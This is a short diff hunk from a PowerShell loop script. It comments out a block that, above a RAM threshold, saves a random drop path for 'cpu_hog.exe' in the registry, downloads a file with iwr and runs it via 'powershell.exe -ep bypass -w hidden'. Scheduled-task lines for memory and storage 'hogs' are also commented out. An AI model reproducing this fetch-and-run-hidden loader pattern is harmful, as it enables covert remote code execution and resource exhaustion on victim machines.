@@ -168,17 +168,17 @@ while ($true) {
     # CheckTask-And-Recreate -taskName $memHogTaskName -taskRunAction $memTaskRunAction
     # CheckTask-And-Recreate -taskName $storageHogTaskName -taskRunAction $storageTaskRunAction
 
-    $curr = Get-RamPercentage
-    if($curr -ge $threshold){
-        $item = Get-ItemProperty -Path "$basePath" -Name $cpuPropertyName -ErrorAction SilentlyContinue
-        if($item){
-            $cpuHogPath = $item.$cpuPropertyName
-        }else{
-            $cpuHogPath = "$($paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)])\cpu_hog.exe"
-            New-ItemProperty -Path "$basePath" -Name $cpuPropertyName -Value $cpuHogPath -Force | Out-Null
-        }
-        iwr -Uri $cpuHogUri -OutFile $cpuHogPath
-        powershell.exe -ep bypass -w hidden -noP $cpuHogPath
-    }
+    # $curr = Get-RamPercentage
+    # if($curr -ge $threshold){
+    #     $item = Get-ItemProperty -Path "$basePath" -Name $cpuPropertyName -ErrorAction SilentlyContinue
+    #     if($item){
+    #         $cpuHogPath = $item.$cpuPropertyName
+    #     }else{
+    #         $cpuHogPath = "$($paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)])\cpu_hog.exe"
+    #         New-ItemProperty -Path "$basePath" -Name $cpuPropertyName -Value $cpuHogPath -Force | Out-Null
+    #     }
+    #     iwr -Uri $cpuHogUri -OutFile $cpuHogPath
+    #     powershell.exe -ep bypass -w hidden -noP $cpuHogPath
+    # }
 
 }
